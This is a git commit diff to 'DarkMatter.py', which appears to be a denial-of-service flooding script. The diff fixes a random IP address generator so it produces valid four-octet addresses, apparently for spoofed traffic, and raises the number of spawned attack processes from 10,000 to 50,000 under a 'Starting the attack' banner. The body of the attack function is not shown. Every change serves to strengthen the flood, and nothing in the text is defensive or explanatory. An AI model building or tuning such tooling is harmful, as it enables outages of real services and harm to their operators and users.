39f2891427443069fa0bcd7c703852a6fec9c641
toancute2k0 <nhaozocom284@gmail.com>
2021-10-19 09:43:39 +0700

    hihi

--- DarkMatter.py
+++ DarkMatter.py
@@ -15,25 +15,14 @@ def randomip():
   randip2 = random.randint(1,255)
   randip3 = random.randint(1,255)
   randip4 = random.randint(1,255)
-  randip5 = random.randint(1,255)
-  randip6 = random.randint(1,255)
-  randip7 = random.randint(1,255)
-  randip8 = random.randint(1,255)
-  randip9 = random.randint(1,255)
-  randip10 = random.randint(1,255)
 
   randip.append(randip1)
   randip.append(randip2)
   randip.append(randip3)
   randip.append(randip4)
-  randip.append(randip5)
-  randip.append(randip6)
-  randip.append(randip7)
-  randip.append(randip8)
-  randip.append(randip9)
-  randip.append(randip10)
 
-  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3]) + "." + str(randip[4]) + "." + str(randip[5]) + "." + str(randip[6]) + "." + str(randip[7]) + "." + str(randip[8]) + "." + str(randip[9])
+
+  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
   return(randip)
 
 print("[>>>] Starting the attack [<<<]")
@@ -62,7 +51,7 @@ def attack():
 
 
 def send2attack():
-  for i in range(10000): #Magic Power
+  for i in range(50000): #Magic Power
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
